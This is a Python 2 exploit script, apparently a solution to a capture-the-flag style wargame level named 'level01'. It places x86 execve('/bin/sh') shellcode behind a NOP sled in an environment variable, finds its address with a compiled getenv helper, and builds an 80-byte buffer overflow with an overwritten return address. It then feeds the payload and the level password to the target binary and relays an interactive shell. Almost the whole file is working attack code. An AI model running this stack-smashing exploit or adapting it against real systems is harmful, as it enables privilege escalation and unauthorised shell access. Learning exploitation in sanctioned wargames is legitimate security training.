#!/usr/bin/env python2

import os
import struct
import subprocess
import binascii
import tempfile
import select
import argparse
import sys

##### FUNCTIONS #####

def convert_address(address, arch):
    if address.startswith('0x'):  # Remove '0x' prefix if present
        address = address[2:]

    # Convert to little endian
    if arch == 32:
        address = address.zfill(8)  # Pad with leading zeros if necessary
        return ''.join([chr(int(address[i:i+2], 16)) for i in range(6, -2, -2)])
    else:
        address = address.zfill(16)  # Pad with leading zeros if necessary
        return ''.join([chr(int(address[i:i+2], 16)) for i in range(14, -2, -2)])

def add_to_address(address, arch, value):
    # If address starts with '0x', remove it
    if address.startswith('0x'):
        address = address[2:]

    # Convert the hexadecimal string to an integer
    address_int = int(address, 16)

    # Add value to the address
    address_int += value

    # Convert the address back to a hexadecimal string
    if arch == 32:
        new_address = hex(address_int)[2:].zfill(8)
    else:
        new_address = hex(address_int)[2:].zfill(16)

    return new_address

def get_binary_arch(filename):
    output = subprocess.check_output(['file', filename])
    if '32-bit' in output:
        return 32
    elif '64-bit' in output:
        return 64
    else:
        raise ValueError("Unknown architecture for binary {}".format(filename))

##### START #####

parser = argparse.ArgumentParser(description="Script to perform actions based on architecture")
parser.add_argument('--arch', default=32, type=int, choices=[32, 64], help="Specify the architecture (32 or 64 bits)")

args = parser.parse_args()

##### GET ENV ADDRESS #####

cc = "gcc"
src = "./getenv.c"
getenv = "./getenv"

if not os.path.isfile(getenv):
    if not os.path.isfile(src):
        with open(src, 'w') as f:
            f.write("""
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
    printf("%p", getenv(argv[1]));
    return 0;
}
""")
    subprocess.call([cc, src, "-o", getenv, "-m"+str(args.arch)])

# Determine architecture of binary
binary_arch = get_binary_arch(getenv)

# If the binary architecture doesn't match the desired architecture, recompile
if binary_arch != args.arch:
    subprocess.call([cc, src, "-o", getenv, "-m"+str(args.arch)])

##### FORGE PAYLOAD #####

elf = "/home/users/level01/level01"

offset = 'A' * 80

# Converting address from hexadecimal to little endian format
os.environ['SC'] = '\x90'*100+'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
#address = convert_address(subprocess.check_output([getenv, "SC"]), args.arch)
address = convert_address(add_to_address(subprocess.check_output([getenv, "SC"]), args.arch, 50), args.arch)

payload = offset + address
#print binascii.hexlify(payload).upper()

##### SEND PAYLOAD #####

# # Start the process
# p = subprocess.Popen(elf, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
#
# # Send the payload
# p.stdin.write("dat_wil\n")
# p.stdin.write(payload + "\n")
# p.stdin.flush()
#
# # Now, interact with the process
# while p.poll() is None:
#     readx = select.select([p.stdout.fileno(), p.stderr.fileno()], [], [])[0]
#     send_buffer = []
#     if p.stdout.fileno() in readx:
#         output = p.stdout.readline()
#         print output.strip()
#
#     if p.stderr.fileno() in readx:
#         output = p.stderr.readline()
#         print output.strip()
#
# # Handle process exit
# exit_code = p.wait()
# if exit_code < 0:
#     print("The process crashed with signal {}".format(-exit_code))
# elif exit_code > 0:
#     print("The process exited with status {}".format(exit_code))
# else:
#     print("The process exited successfully")

# Start the process
p = subprocess.Popen(elf, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# Send the payload
p.stdin.write("dat_wil\n")
p.stdin.write(payload + "\n")
p.stdin.flush()

# Now, interact with the process
while p.poll() is None:
    ready, _, _ = select.select([p.stdout, p.stderr, sys.stdin], [], [])  # Wait for input from stdout, stderr, or user

    for stream in ready:
        if stream is p.stdout:
            output = p.stdout.readline()
            print output.strip()
        elif stream is p.stderr:
            output = p.stderr.readline()
            print output.strip()
        elif stream is sys.stdin:
            user_input = sys.stdin.readline().strip()
            p.stdin.write(user_input + "\n")
            p.stdin.flush()

# Handle process exit
exit_code = p.wait()
if exit_code < 0:
    print("The process crashed with signal {}".format(-exit_code))
elif exit_code > 0:
    print("The process exited with status {}".format(exit_code))
else:
    print("The process exited successfully")
